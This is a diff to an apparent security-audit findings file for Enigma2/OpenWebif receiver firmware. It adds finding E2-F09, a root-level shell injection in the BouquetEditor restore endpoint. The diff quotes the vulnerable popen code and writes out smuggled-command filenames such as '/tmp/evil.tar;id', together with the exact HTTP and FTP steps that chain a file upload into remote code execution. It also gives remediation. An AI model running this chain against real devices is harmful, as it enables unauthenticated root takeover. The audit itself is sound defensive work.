@@ -27,6 +27,9 @@ FINDINGS SUMMARY:
                           package= param directly concatenated into shell command, no sanitization
   E2-F08 (HIGH/8.1)      REST filesystem: /fs endpoint, root='/', read any file + dir listing +
                           POST writes new files to any writable dir; separate surface from E2-F02
+  E2-F09 (HIGH/8.0)      BouquetEditor /bouqueteditor/web/restore: os.popen() injection via
+                          Filename= param; path.exists() gate bypassed via E2-F08 or E2-F03;
+                          commented-out path.join() confinement; 2-step chain to RCE as root
 
 BINARY RE FINDINGS (enigma2 C binary, ARM32):
   E2-BIN-F01 (MEDIUM/5.0) Unbounded strcpy into 4KB stack at 0x25eca8 (service dispatcher)
@@ -51,6 +54,28 @@ BINARY RE SCAN COMPLETENESS:
   strcat:  all 4 callers traced — no user-controlled destination overflow
   system:  all 3 callers traced — shutdown mechanism only
   execvp:  1 caller — E2-F07 chain confirmed
+
+SOURCE AUDIT COMPLETENESS (all OpenWebif controllers):
+  ipkg.py:           E2-F07 — popen via eConsoleAppContainer(cmd) — CRITICAL
+  rest_fs_access.py: E2-F08 — RESTFilesystemController root='/' — HIGH
+  BouquetEditor.py:  E2-F09 — os.popen(Filename) in restoreFiles — HIGH
+  BQE.py:            hosts BouquetEditor + static.File('/tmp') at /bouqueteditor/tmp/
+  transcoding.py:    CLEAN — config whitelist validation
+  grab.py:           CLEAN — whitelist + int cast
+  mediaplayer.py:    CLEAN — enum dispatch
+  owibranding.py:    CLEAN — hardcoded os.popen args
+  web.py:            CLEAN — no eConsole/system calls
+  ajax.py:           CLEAN — enigma2 service API only
+  stream.py:         CLEAN — DVB service reference, not shell
+  file.py:           E2-F02 surface — arbitrary file read (already documented)
+  mobile.py:         CLEAN — no injection primitives
+  AT.py, ER.py, SR.py: CLEAN
+  rest.py, rest_api_controller.py, rest_configuration_api.py: CLEAN
+  api.py:            CLEAN
+  base.py:           CLEAN — base class only
+  wol.py:            CLEAN — Wake-on-LAN only
+  utilities.py:      CLEAN — helper functions
+  BouquetEditor.py:  E2-F09 documented above
 """
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -812,10 +837,104 @@ E2_F08_REST_FS_ACCESS = {
         "POST /fs/media/hdd?filename=backdoor.sh (multipart data=#!/bin/sh\\nid) → write to external HDD"
     ),
     "source_audit_coverage": (
-        "All OpenWebif controllers audited: transcoding (safe — config whitelist), "
+        "Primary controllers audited: transcoding (safe — config whitelist), "
         "grab (safe — whitelist+int cast), mediaplayer (safe — enum dispatch), "
         "owibranding (safe — hardcoded os.popen args), web.py (safe — no eConsole/system calls). "
-        "No additional injection points beyond E2-F07 and E2-F08 found."
+        "BouquetEditor.py audit found E2-F09 (popen injection in restoreFiles). "
+        "See E2-F09 for full source audit completeness."
+    ),
+}
+
+# ──────────────────────────────────────────────────────────────────────────────
+# FINDING E2-F09: BouquetEditor restoreFiles popen injection (HIGH)
+# ──────────────────────────────────────────────────────────────────────────────
+
+E2_F09_BOUQUETEDITOR_POPEN = {
+    "finding_id": "E2-F09",
+    "severity": "HIGH",
+    "cvss_v3": 8.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "status": "CONFIRMED",
+    "title": "BouquetEditor /bouqueteditor/web/restore: popen injection via Filename parameter",
+    "component": "OpenWebif controllers/BouquetEditor.py — restoreFiles()",
+    "http_controller": "controllers/BQE.py — BQEWebController.P_restore()",
+    "route": "/bouqueteditor/web/restore",
+    "auth_required": False,
+    "auth_note": "Same auth gate as all OpenWebif endpoints. Auth=False by default (E2-F04).",
+    "vulnerable_code": {
+        "BQE.py_P_restore": (
+            "def P_restore(self, request):\n"
+            "    bqe = BouquetEditor(self.session, func=BouquetEditor.RESTORE)\n"
+            "    bqe.handleCommand(request.args['Filename'][0])  # unsanitized user input\n"
+        ),
+        "BouquetEditor.py_restoreFiles": (
+            "def restoreFiles(self, param):\n"
+            "    tarFilename = param                  # raw user-supplied path, no sanitization\n"
+            "    backupFilename = tarFilename         # commented-out path.join('/tmp', ...) bypass\n"
+            "    if path.exists(backupFilename):      # gating condition\n"
+            "        lines = popen('tar -tf %s' % backupFilename).readlines()  # INJECTION\n"
+            "        ...\n"
+            "        lines = popen('tar xvf %s -C / --exclude tmp/.webouquetedit' % backupFilename).readlines()  # INJECTION\n"
+        ),
+        "commented_out_path_confinement": (
+            "backupFilename = tarFilename  # was: path.join(self.BACKUP_PATH, tarFilename)\n"
+            "BACKUP_PATH = '/tmp'  # developer commented out path confinement — no longer applies"
+        ),
+    },
+    "injection_mechanism": (
+        "os.popen(string) invokes /bin/sh -c <string>. "
+        "Shell interprets ';' in the filename as command separator. "
+        "Attacker supplies Filename=/tmp/evil.tar;id → shell runs 'tar -tf /tmp/evil.tar' then 'id'. "
+        "Newline, pipe, backtick, $() substitution also applicable."
+    ),
+    "exploit_prerequisite": (
+        "path.exists(backupFilename) must be True before popen is reached. "
+        "Attacker must create a file at the injected path with shell metacharacters in the name."
+    ),
+    "prerequisite_bypass": {
+        "via_E2_F08": (
+            "POST /fs/tmp?filename=evil.tar;id → creates /tmp/evil.tar;id (basename split, no slash). "
+            "Then GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id "
+            "→ path.exists('/tmp/evil.tar;id') = True → popen injection fires."
+        ),
+        "via_E2_F03": (
+            "FTP PUT to /tmp/evil.tar;id (FTP protocol allows semicolons in filenames). "
+            "Then GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;id → injection fires."
+        ),
+        "via_preexisting_file": (
+            "/etc/shadow, /etc/passwd, /etc/vsftpd.conf all exist. "
+            "Filename=/etc/passwd;id → path.exists('/etc/passwd;id') = False. "
+            "The semicolon is part of the literal path, so /etc/passwd;id does not exist. "
+            "Preexisting files only work if a semicolon-containing name can be confirmed."
+        ),
+    },
+    "also_notable": {
+        "BQE_tmp_static_serve": (
+            "BQEController mounts static.File('/tmp') at /bouqueteditor/tmp/. "
+            "GET /bouqueteditor/tmp/<filename> serves any file from /tmp/. "
+            "Can confirm file creation before triggering restore injection."
+        ),
+        "backup_endpoint_safe": (
+            "P_backup passes Filename through invalidCharacters.sub('[^A-Za-z0-9_. ]+', '_') "
+            "before building backupFilename — sanitization applied. Backup is NOT injectable."
+        ),
+    },
+    "chain": (
+        "E2-F04 (auth=False default) OR E2-F01 (auth bypass) "
+        "→ E2-F08 (POST /fs/tmp to create /tmp/evil.tar;<cmd>) "
+        "→ E2-F09 (GET /bouqueteditor/web/restore?Filename=/tmp/evil.tar;<cmd>) "
+        "→ popen → RCE as root. "
+        "Simpler but requires 2 HTTP requests vs E2-F07 (1 request)."
+    ),
+    "remediation": (
+        "1. Restore path confinement: backupFilename = path.join(self.BACKUP_PATH, tarFilename). "
+        "2. Apply same invalidCharacters.sub() sanitization as backupFiles(). "
+        "3. Replace os.popen() with subprocess.run(['tar', '-tf', backupFilename]) — no shell=True. "
+        "4. Validate tarFilename is a valid filename with no path separators."
+    ),
+    "cvss_ac_h_rationale": (
+        "AC:H because attacker must first create a file with semicolon in name via a secondary step "
+        "(E2-F08 or E2-F03). If E2-F08 or E2-F03 is already exploited, this becomes trivial chaining."
     ),
 }
 
